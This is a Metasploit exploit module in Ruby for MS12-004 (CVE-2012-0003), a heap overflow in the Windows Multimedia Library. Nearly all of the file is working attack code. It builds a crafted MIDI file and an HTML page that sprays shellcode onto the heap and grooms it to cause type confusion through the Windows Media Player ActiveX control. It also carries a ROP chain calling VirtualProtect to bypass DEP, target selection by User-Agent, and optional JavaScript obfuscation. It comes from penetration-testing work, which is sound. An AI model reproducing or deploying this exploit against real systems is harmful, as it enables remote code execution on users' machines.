##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS12-004 midiOutPlayNextPolyEvent Heap Overflow",
			'Description'    => %q{
					This module exploits a heap overflow vulnerability in the Windows Multimedia
				Library (winmm.dll). The vulnerability occurs when parsing specially crafted
				MIDI files.  Remote code execution can be achieved by using Windows Media Player's
				ActiveX control.

					Exploitation is done by supplying a specially crafted MIDI file with
				specific events, causing the offset calculation being higher than how much is
				available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing
				us to either "inc al" or "dec al" a byte.  This can be used to corrupt an array
				(CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects,
				which leverages remote code execution under the context of the user.

					At this time, for IE 8 target, JRE (Java Runtime Environment) is required
				to bypass DEP (Data Execution Prevention).

					Note: Based on our testing, the vulnerability does not seem to trigger when
				the victim machine is operated via rdesktop.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Shane Garrett',  #Initial discovery (IBM X-Force)
					'juan vazquez',
					'sinn3r',
				],
			'References'     =>
				[
					[ 'MSB', 'MS12-004'],
					[ 'CVE', '2012-0003' ],
					[ 'OSVDB', '78210'],
					[ 'BID', '51292'],
					[ 'URL', 'http://www.vupen.com/blog/20120117.Advanced_Exploitation_of_Windows_MS12-004_CVE-2012-0003.php' ],
				],
			'Payload'        =>
				{
					'Space'    => 1024,
				},
			'DefaultOptions'  =>
				{
					'EXITFUNC'             => "process",
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[
						'IE 6 on Windows XP SP3',
						{
							'Rop' => false,
							'DispatchDst' => 0x0c0c0c0c
						}
					],
					[
						'IE 7 on Windows XP SP3',
						{
							'Rop' => false,
							'DispatchDst' => 0x0c0c0c0c
						}
					],
					[
						'IE 8 on Windows XP SP3',
						{
							# xchg ecx,esp
							# or byte ptr [eax],al
							# add byte ptr [edi+5Eh],bl
							# ret 8
							# From IMAGEHLP
							'Rop' => true,
							'StackPivot' => 0x76C9B4C2,
							'DispatchDst' => 0x0c0c1be4
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jan 10 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(request)
		agent = request.headers['User-Agent']
		vprint_status("Request from: #{agent}")

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
			#Windows XP SP3 + IE 6.0
			return targets[1]
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
			#Windows XP SP3 + IE 7.0
			return targets[2]
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8\.0/
			#Windows XP SP3 + IE 8.0 + JRE6
			return targets[3]
		else
			return nil
		end
	end

	def get_midi
		# MIDI Fileformat Reference:
		# http://www.sonicspot.com/guide/midifiles.html
		#
		# Event Types:
		# 0x08 = Note Off (when MIDI key is released)
		# 0x09 = Note On (when MIDI key is pressed)
		# 0x0A = Note aftertouch (pressure change on the pressed MIDI key)
		# 0x0B = Controller Event (MIDI channels state)
		# 0x0C = Program change (Which instrument/patch should be played on the MIDI channel)
		# 0x0D = Channel aftertouch (similar to Note Aftertouch; effects all keys pressed on the specific MIDI channel)
		# 0x0E = Pitch Bend (similiar to a controller event; has 2 bytes to describe its value)
		# 0x0F = Meta Events (not sent or received over a midi port)

		# Structure:
		# [Header Chunk][Track Chunk][Meta Event][Meta Event][SYSEX Event][Midi Channel Event)
		# Problem:
		# Windows Media Player fails to manage Note On and Note Off Events

		# Track Chunk Data
		tc = "\x00\xFF\x03\x0D\x44\x72\x75\x6D"
		# Meta Event - Sequence/Track Name
		tc << "\x73\x20\x20\x20\x28\x42\x42\x29\x00"
		# Midi Channel Event - Program Change
		tc << "\x00\xC9\x28"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x07\x64"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x0A\x40"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x7B\x00"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x5B\x28"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x5D\x00"
		# Midi Channel Event - Note On
		tc << "\x85\x50\x99\x23\x7F"

		# Corruption events
		# Midi Channel Event - Note On
		tc << "\x00\x9F\xb2\x73"
		# Ends Corruption events

		# Meta Event - End Of Track
		tc << "\x00\xFF\x2F\x00"
		m = ''
		# HEADERCHUNK Header
		m << "MThd"                 # Header
		m << "\x00\x00\x00\x06"     # Chunk size
		m << "\x00\x00"             # Format Type
		m << "\x00\x01"             # Number of tracks
		m << "\x00\x60"             # Time division
		# TRACKCHUNK header
		m << "MTrk"                 # Header
		m << [tc.length].pack('N')
		m << tc

		midi_name = "test_case.mid"

		return midi_name, m
	end

	def on_request_uri(cli, request)

		if request.uri =~ /\.mid$/i
			print_status("Sending midi file to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, @midi, {'Content-Type'=>'application/octet-strem'})
			return
		end

		#Set default target
		my_target = target

		#If user chooses automatic target, we choose one based on user agent
		if my_target.name =~ /Automatic/
			my_target = get_target(request)
			if my_target.nil?
				send_not_found(cli)
				print_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")
				return
			end
			vprint_status("Target selected: #{my_target.name}")
		end

		midi_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
		midi_uri << "/#{@m_name}"

		spray = build_spray(my_target)

		if datastore['OBFUSCATE']
			spray = ::Rex::Exploitation::JSObfu.new(spray)
			spray.obfuscate
		end

		trigger = build_trigger(my_target)
		trigger_fn = "trigger"

		if datastore['OBFUSCATE']
			trigger = ::Rex::Exploitation::JSObfu.new(trigger)
			trigger.obfuscate
			trigger_fn = find_trigger_fn(trigger.to_s)
		end

		html = %Q|
		<html>
		<head>
		<script language='javascript'>
			#{spray}
		</script>
		<script language='javascript'>
			#{trigger}
		</script>
		<script for=audio event=PlayStateChange(oldState,newState)>
			if (oldState == 3 && newState == 0) {
				#{trigger_fn}();
			}
		</script>
		</head>
		<body>
			<object ID="audio" WIDTH=1 HEIGHT=1 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
				<param name="fileName" value="#{midi_uri}">
				<param name="SendPlayStateChangeEvents" value="true">
				<param NAME="AutoStart" value="True">
				<param name="uiMode" value="mini">
				<param name="Volume" value="-300">
			</object>
		</body>
		</html>
		|

		html = html.gsub(/^\t\t/, '')

		print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

	def exploit
		@m_name, @midi = get_midi
		super
	end

	def build_spray(my_target)

		# Extract string based on target
		if my_target.name == 'IE 8 on Windows XP SP3'
			js_extract_str = "var block = shellcode.substring(2, (0x40000-0x21)/2);"
		else
			js_extract_str = "var block = shellcode.substring(0, (0x80000-6)/2);"
		end

		# Build shellcode based on Rop requirement
		if my_target['Rop']
			code = create_rop_chain(my_target)
			code << payload.encoded
			shellcode = Rex::Text.to_unescape(code)
		else
			code = payload.encoded
			shellcode = Rex::Text.to_unescape(code)
		end

		# 1. Create  big block of nops
		# 2. Compose one block which is nops + shellcode
		# 3. Repeat the block
		# 4. Extract string from the big block
		# 5. Spray
		spray = <<-JS
		var heap_obj = new heapLib.ie(0x10000);

		var code = unescape("#{shellcode}");
		var nops = unescape("%u0c0c%u0c0c");

		while (nops.length < 0x1000) nops+= nops;

		var shellcode =  nops.substring(0,0x800 - code.length) + code;

		while (shellcode.length < 0x40000) shellcode += shellcode;

		#{js_extract_str}

		heap_obj.gc();
		for (var i=0; i < 600; i++) {
			heap_obj.alloc(block);
		}

		JS

		spray = heaplib(spray, {:noobfu => true})
		return spray
	end

	# Build the JavaScript string for the attributes
	def build_element(element_name, my_target)
		dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack("V"))
		element = ''

		if my_target.name =~ /IE 8/
			max   = 63   # Number of attributes for IE 8
			index = 1    # Where we want to confuse the type
		else
			max   = 55   # Number of attributes for before IE 8
			index = 0    # Where we want to confuse the type
		end

		element << "var #{element_name} = document.createElement(\"select\")" + "\n"

		# Build attributes
		0.upto(max) do |i|
			obj = (i==index) ? "unescape(\"#{dst}\")" : "alert"
			element << "#{element_name}.w#{i.to_s} = #{obj}" + "\n"
		end

		return element
	end

	# Feng Shui and triggering Steps:
	# 1. Run the garbage collector before allocations
	# 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)
	# 3. Make holes
	# 4. Let windows media play the crafted midi file and corrupt the heap
	# 5. Force the using of the confused tagVARIANT.
	def build_trigger(my_target)

		if my_target.name == 'IE 8 on Windows XP SP3'

			# Redoing the feng shui if fails makes it reliable
			js_trigger = <<-JSTRIGGER
			function trigger(){
				var k = 999;
				while (k > 0) {
					if (typeof(clones[k].w1) == "string") {
					} else {
						clones[k].w1('come on!');
					}
					k = k - 2;
				}
				feng_shui();
				document.audio.Play();
			}
			JSTRIGGER

			select_element = build_element('selob', my_target)
		else

			js_trigger = <<-JSTRIGGER
			function trigger(){
				var k = 999;
				while (k > 0) {
					if (typeof(clones[k].w0) == "string") {
					} else {
						clones[k].w0('come on!');
					}
					k = k - 2;
				}
				feng_shui();
				document.audio.Play();
			}
			JSTRIGGER

			select_element = build_element('selob', my_target)
		end

		trigger = <<-JS
			var heap = new heapLib.ie();
			#{select_element}
			var clones=new Array(1000);

			function feng_shui() {

				heap.gc();

				var i = 0;
				while (i < 1000) {
					clones[i] = selob.cloneNode(true)
					i = i + 1;
				}

				var j = 0;
				while (j < 1000) {
					delete clones[j];
					CollectGarbage();
					j  = j + 2;
				}

			}

			feng_shui();

			#{js_trigger}
		JS

		trigger = heaplib(trigger, {:noobfu => true})
		return trigger
	end

	def find_trigger_fn(trigger)
		fns = trigger.scan(/function ([a-zA-Z0-9_]+)\(\)/)
		if fns.nil? or fns.empty?
			return "trigger"
		else
			return fns.last.first
		end
		return "trigger"
	end

	def junk(n=1)
		tmp = []
		value = rand_text(4).unpack("L")[0].to_i
		n.times { tmp << value }
		return tmp
	end

	# ROP chain copied from ms11_050_mshtml_cobjectelement.rb (generated by mona)
	# Added a little of roping to adjust the stack pivoting for this case
	# Specific for IE8 XP SP3 case at this time
	def create_rop_chain(my_target)

		rop_gadgets =
		[
			0x7c347f98,  # RETN (ROP NOP) [msvcr71.dll]
			my_target['StackPivot'],  # stackpivot
			junk, # padding
			0x7c376402,  # POP EBP # RETN [msvcr71.dll]
			0x7c376402,  # skip 4 bytes [msvcr71.dll]
			0x7c347f97,  # POP EAX # RETN [msvcr71.dll]
			0xfffff800,  # Value to negate, will become 0x00000201 (dwSize)
			0x7c351e05,  # NEG EAX # RETN [msvcr71.dll]
			0x7c354901,  # POP EBX # RETN [msvcr71.dll]
			0xffffffff,
			0x7c345255,  # INC EBX # FPATAN # RETN [msvcr71.dll]
			0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll]
			0x7c344f87,  # POP EDX # RETN [msvcr71.dll]
			0xffffffc0,  # Value to negate, will become 0x00000040
			0x7c351eb1,  # NEG EDX # RETN [msvcr71.dll]
			0x7c34d201,  # POP ECX # RETN [msvcr71.dll]
			0x7c38b001,  # &Writable location [msvcr71.dll]
			0x7c34b8d7,  # POP EDI # RETN [msvcr71.dll]
			0x7c347f98,  # RETN (ROP NOP) [msvcr71.dll]
			0x7c364802,  # POP ESI # RETN [msvcr71.dll]
			0x7c3415a2,  # JMP [EAX] [msvcr71.dll]
			0x7c347f97,  # POP EAX # RETN [msvcr71.dll]
			0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
			0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN [msvcr71.dll]
			0x7c345c30,  # ptr to 'push esp #  ret ' [msvcr71.dll]
		].flatten.pack('V*')

		return rop_gadgets
	end


end
